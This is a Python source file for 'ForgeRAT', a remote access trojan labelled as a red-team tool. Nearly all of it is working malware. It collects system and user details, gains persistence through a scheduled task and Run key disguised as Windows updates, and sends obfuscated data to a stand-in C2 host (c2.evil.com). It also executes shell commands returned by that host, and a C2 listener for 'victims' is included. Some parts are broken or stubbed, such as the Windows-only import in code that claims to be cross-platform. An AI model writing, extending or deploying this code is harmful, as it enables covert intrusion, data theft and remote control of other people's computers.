#!/usr/bin/env python3
# ForgeRAT.py - Cross-Platform Remote Access Trojan (2026 Red Team Elite)
# Hand-coded for authorized remote pentest / red-team testing only
# EPO - Explicit Written Permission ONLY! 💀

import socket
import sys
import time
import random
import base64
import datetime
import os
import subprocess
import getpass
import platform
import json
import threading
import ctypes
import ctypes.wintypes as wintypes
from pathlib import Path
from urllib.request import urlopen, Request

kernel32 = ctypes.windll.kernel32

# ================= CONFIG =================
DEFAULT_C2_URL = "https://c2.evil.com:443/beacon"
SLEEP_MIN = 10
SLEEP_MAX = 60
JITTER = 0.5
XOR_KEY = 0xF9A3D7E1

# ================= UTILITY =================
def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def xor(data: bytes) -> bytes:
    return bytes(b ^ (XOR_KEY & 0xFF) for b in data)

def fake_delay(min_sec=3, max_sec=15):
    time.sleep(random.uniform(min_sec, max_sec))

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ================= RECON & DATA COLLECTION =================
def collect_system_info():
    info = {
        "time": timestamp(),
        "hostname": platform.node(),
        "user": getpass.getuser(),
        "domain": platform.node().split(".", 1)[1] if "." in platform.node() else "WORKGROUP",
        "os": f"{platform.system()} {platform.release()}",
        "arch": platform.machine(),
        "pid": os.getpid(),
        "admin": is_admin(),
        "local_ip": socket.gethostbyname(socket.gethostname()),
        "processes": [],
    }

    try:
        out = subprocess.check_output("tasklist /FO CSV /NH", shell=True, timeout=8).decode(errors='ignore')
        info["processes"] = [line.split(",")[0].strip('"') for line in out.splitlines()[:30]]
    except:
        pass

    return info

# ================= PERSISTENCE =================
def add_persistence():
    if platform.system() != "Windows" or not is_admin():
        return

    # Schtasks persistence
    task_cmd = (
        f'schtasks /create /tn "WindowsUpdateCheck" /tr "python -c \\"import socket;exec(\\'{base64.b64encode(b"print(\\'Connected\\')").decode()}\\' )\\"" '
        f'/sc minute /mo 5 /ru SYSTEM /f'
    )
    subprocess.call(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Registry Run key
    try:
        import winreg as reg
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "UpdateService", 0, reg.REG_SZ, sys.executable + " " + __file__)
        reg.CloseKey(key)
    except:
        pass

# ================= BEACON LOOP =================
def beacon_loop(c2_url: str):
    backoff = SLEEP_MIN
    print(f"[{timestamp()}] ForgeRAT starting → C2: {c2_url}")

    while True:
        try:
            fake_delay(1, 4)

            # Collect data
            info = collect_system_info()
            payload = json.dumps(info)
            obfuscated = base64.b64encode(xor(payload.encode())).decode()

            # Send via HTTP POST
            req = Request(c2_url, data=obfuscated.encode(), headers={'User-Agent': random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            ])})
            with urlopen(req, timeout=10) as resp:
                task = resp.read().decode(errors='ignore').strip()

            if task:
                print(f"[{timestamp()}] Task received: {task}")
                # Handle tasks (expand: shell, screenshot, download, etc.)
                if task.startswith("shell:"):
                    cmd = task[6:]
                    try:
                        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                        send_result = base64.b64encode(xor(out)).decode()
                        # Send back (expand to POST)
                        print(f"[{timestamp()}] Result: {out.decode(errors='ignore')}")
                    except Exception as e:
                        print(f"[{timestamp()}] Task failed: {e}")

            # Sleep
            sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
            jittered = int(sleep_time * (1 + random.uniform(-JITTER, JITTER)))
            print(f"[{timestamp()}] Sleeping {jittered}s")
            time.sleep(jittered)

            backoff = SLEEP_MIN

        except Exception as e:
            print(f"[{timestamp()}] Error: {e}")
            backoff = min(backoff * 2, 1800)
            jittered = int(backoff * (1 + random.uniform(-JITTER, JITTER)))
            time.sleep(jittered)

# ================= C2 LISTENER (simple) =================
def c2_listener(host: str, port: int):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(10)
    print(f"[{timestamp()}] C2 listening on {host}:{port}")

    while True:
        client, addr = server.accept()
        print(f"[{timestamp()}] New victim beacon from {addr}")
        data = client.recv(16384).decode(errors='ignore')
        print(data)
        # Send task
        task = input(f"[{addr}] Task> ").strip()
        client.send(task.encode())
        client.close()

# ================= MAIN =================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python ForgeRAT.py c2 <host> <port>")
        print("  python ForgeRAT.py beacon <c2_url>")
        sys.exit(1)

    mode = sys.argv[1].lower()

    if mode == "c2":
        c2_listener(sys.argv[2], int(sys.argv[3]))
    elif mode == "beacon":
        c2_url = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_C2_URL
        add_persistence()  # try to persist
        beacon_loop(c2_url)
    else:
        print("Invalid mode")
        sys.exit(1)